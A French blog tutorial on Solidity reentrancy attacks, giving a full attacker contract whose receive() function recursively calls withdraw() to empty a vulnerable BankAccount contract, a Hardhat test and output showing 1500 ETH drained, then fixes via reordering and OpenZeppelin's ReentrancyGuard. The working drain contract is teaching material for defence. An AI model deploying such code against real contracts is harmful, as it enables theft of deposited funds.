---
layout: '../../layouts/Blog.astro'

title: "Solidity: attaque par re-entrance la suite"
description: "Suite du tutoriel solidity expliquant les attaques de re-entrance avec l'étude d'un cas concret."
blogPost: "Attaque par 'Ré-entrance' (reentrancy)"
image: false
canonical: "https://www.developpement-web3.fr/smart-contract/solidity-reentrancy-attack-suite/"
---

## Réalisation d'une attaque par "reentrancy"
 Pour réaliser notre attaque nous devons d'abord créer un nouveau smart contract qui va appeler notre smart contract <b>BankAccount</b>.
                                <br>Créeons pour cela un nouveau smart contract nommé <b>Attack</b> :
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";
interface InterfaceBankAccount {
  function deposit() external payable;
  function withdraw() external;
}

contract Attack  is Ownable {
  InterfaceBankAccount public immutable bankAccountSmartContractAddress;

  constructor(address _bankAccountSmartContractAddress) {
    bankAccountSmartContractAddress = InterfaceBankAccount(_bankAccountSmartContractAddress);
  }
}
```
  Afin de pouvoir dialoguer avec le smart contract <b>BankAccount</b> nous créeons une interface contenant les deux méthodes que l'on souhaitera appeler,
                                puis lors de l'initialisation de notre nouveau smart contract, nous passons l'adresse du smart contract <b>BankAccount</b> et initialisons ce dernier via notre interface.
                                <br>Puis nous pouvons écrire la méthode qui va permettre d'initier l'attaque :
```solidity
function attack() external payable onlyOwner {
    bankAccountSmartContractAddress.deposit{ value: msg.value }();
    bankAccountSmartContractAddress.withdraw();
  }
```

  Cette méthode réalise tout d'abord un dépôt dans notre <b>BankAccount</b>, puis et c'est là où cela va devenir intéressant, demande un retrait juste après avoir effectué le dépôt.
                               <br>
                                La méthode <b>withdraw</b> du contrat <b>BankAccount</b> va alors exécuter l'opération: <b> payable(msg.sender).sendValue(depositedAmount)</b>, c'est à dire faire une demande d'envoi d'argent à celui qui en fait la demande.
                                <br>Or cette fois, c'est notre smart contract <b>Attack</b> qui est l'origine de la demande, donc c'est lui qui va recevoir les fonds. Jusque là, pas de problème.
                                <br>Lorsqu'un smart contract reçoit des fonds, une méthode <b>receive</b> est automatiquent appelée. C'est dans celle ci que l'on va pouvoir mettre en place notre attaque:
                       
```solidity
receive() external payable {
    if (address(bankAccountSmartContractAddress).balance > 0) {
      // Reentrancy by calling again withdraw
      bankAccountSmartContractAddress.withdraw();
    } else {
      console.log("Transfering money...");
      payable(owner()).transfer(address(this).balance);
    }
  }
```
   Il suffit de ré-écrire la méthode <b>receive</b>, pour que quand elle reçoit de l'argent, elle vérifie si le contrat appelant (<b>BankAccount</b>) contient toujours des fonds (c'est à dire si sa balance est spérieure à 0),
                                 et si c'est le cas, elle rappelle aussitôt la méthode <b>withdraw</b>. C'est ainsi que la récursivité va entrer en jeu et que les fonds vont être vidés.
                                 <br>Ensuite si il n'y a plus de fond disponible, notre smart contract attaquant va demander un tranfert immédiat de tout l'argent récolté vers le compte propriétaire du smart contract attaquant.
                                 <br><br>Wow ! 
                                 <br><br>En fait ceci est possible car dans la méthode <b>withdraw</b> on a d'abord la ligne:
                                 <br> <b>payable(msg.sender).sendValue(depositedAmount)</b> puis la ligne:<br> <b>balanceOf[msg.sender] = 0;</b>
                                 <br>
                                 <br>Donc la méthode payable appelle la méthode receive qui rappelle la méthode withdraw qui redéclenche un payable qui appelle la méthode receive, ... 
                                 C'est seulement lorsque la récursivité finit que la ligne <b>balanceOf[msg.sender] = 0;</b> est exécuté.

## Test de l'attaque par "reentrancy"

   Pour vérifier mes propos, écrivons notre test:

```typescript
import { assert, expect } from "chai";
import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
describe("ReentrancyAttack", function () {
    async function deployFixture() {
      const [owner, attacker, account1,account2,account3] = await ethers.getSigners();
      const BankAccountFactory = await ethers.getContractFactory("BankAccount",owner);
      const bankAccountContract = await BankAccountFactory.deploy();

      const attackFactory = await ethers.getContractFactory("Attack",attacker);
      const attackContract = await attackFactory.deploy(bankAccountContract.address);
      return { bankAccountContract, attackContract,owner, attacker,account1,account2,account3};
    }
  
   
      
    describe("Attack", function () {
      it("Should drains all ETH from bank contract", async function () {
        const { bankAccountContract,attackContract, owner,attacker,account1,account2,account3 } = await loadFixture(deployFixture);
        // Deposit to bank from different accounts
        await bankAccountContract.connect(account1).deposit({ value: ethers.utils.parseEther("500") });
        await bankAccountContract.connect(account2).deposit({ value: ethers.utils.parseEther("500") });
        await bankAccountContract.connect(account3).deposit({ value: ethers.utils.parseEther("500") });
        // check balance before attack 
        let accountBalanceBeforeAttack =  await ethers.provider.getBalance(attacker.address);
        console.log(`BankAccount before : ${ethers.utils.formatEther(await ethers.provider.getBalance(bankAccountContract.address)).toString()}`);
        console.log(`===Attacker balance before : ${ethers.utils.formatEther(accountBalanceBeforeAttack).toString()}`);
       
        await attackContract.attack({ value: ethers.utils.parseEther("500") })
       
        // check balance after attack
        let accountBalanceAfterAttack =  await ethers.provider.getBalance(attacker.address);
        let bankBalanceAfter = await ethers.provider.getBalance(bankAccountContract.address)
        console.log(`BankAccount after : ${ethers.utils.formatEther(bankBalanceAfter).toString()}`);
        console.log(`===Attacker balance after : ${ethers.utils.formatEther(accountBalanceAfterAttack).toString()}`);
        expect(bankBalanceAfter).to.eq(ethers.utils.parseEther("0"));
      });
  
       
    });
    
  });
  ```
   et voici ce que donne l'exécution du test:
```typescript
npx hardhat test 


  ReentrancyAttack
    Attack
BankAccount before : 1500.0
===Attacker balance before : 9999.998937286964659732
Transfering money...
BankAccount after : 0.0
===Attacker balance after : 11499.998820990915721432
      ✔ Should drains all ETH from bank contract (781ms)
```
 Comme on peut le voir, notre smart contract <b>BankAccount</b> a un solde de 0 ETH tandis que celui de l'attaquant a été crédité de +1500 ETH...
                            
## Protection contre l'attaque par "reentrancy"
   Dans le cas étudié pour se protéger de l'attaque, le moyen le plus simple est d'intervertir les 2 lignes <b>balanceOf[msg.sender] = 0</b> et <b> payable(msg.sender).sendValue(depositedAmount)</b> comme ceci:
                          
```solidity
function withdraw() external nonReentrant{
    require(balanceOf[msg.sender] > 0, "Pas de fond a retirer");

    uint256 depositedAmount = balanceOf[msg.sender];
    balanceOf[msg.sender] = 0;
    payable(msg.sender).sendValue(depositedAmount);
  }
```

Ainsi on met le solde de l'appelant à 0 avant de lui envoyer l'argent, donc si ce dernier essaye de rappeller notre méthode de retrait, son solde sera à 0 et la transaction sera rejetée grâce à notre première ligne <b>require</b>
                               <br>Voici ce que donne l'exécution du test:
```typescript
npx hardhat test 


 1) ReentrancyAttack
       Attack
         Should drains all ETH from bank contract:
     Error: VM Exception while processing transaction: reverted with reason string 'Address: unable to send value, recipient may have reverted'
```

Une autre solution aurait été d'implémenter ce que l'on appelle un lock (positionnement d'une variable en entrée et en sortie de fonction et vérification de la valeur du lock avant d'autoriser l'execution de la méthode).
                               <br><br>Mais le plus simple est d'utiliser la librairie [d'OpenZeppelin](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) **ReentrancyGuard** prévue pour ça:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract BankAccount is ReentrancyGuard {
  using Address for address payable;
  mapping(address => uint256) public balanceOf;

  function deposit() external payable  {
    balanceOf[msg.sender] += msg.value;
  }

  function withdraw() external nonReentrant{
    require(balanceOf[msg.sender] > 0, "Pas de fond a retirer");

    uint256 depositedAmount = balanceOf[msg.sender];
    payable(msg.sender).sendValue(depositedAmount);
    balanceOf[msg.sender] = 0;
    
  }
}
```

Il suffit de déclarer toutes les méthodes pour lesquelles on veut éviter la ré-entrance possible avec le mot clé: <b>nonReentrant</b>.
                             <br><br>Et voilà. 
                             <br><br>J'espère que ce tutoriel vous a plu. Pour rappel, vous pouvez trouver le code source de cet article <a href="https://github.com/csurbier/tutoriels-developpement-web3" target="_blank">sur mon GitHub.</a>
                           


Vous pouvez aussi soutenir ce site en envoyant de l'ETH ou du MATIC:

<img style="width: 100px;" src="/img/qr-code.png">


<style>
    p { color: white;!important }
    a { color:darkorange!important}
  </style>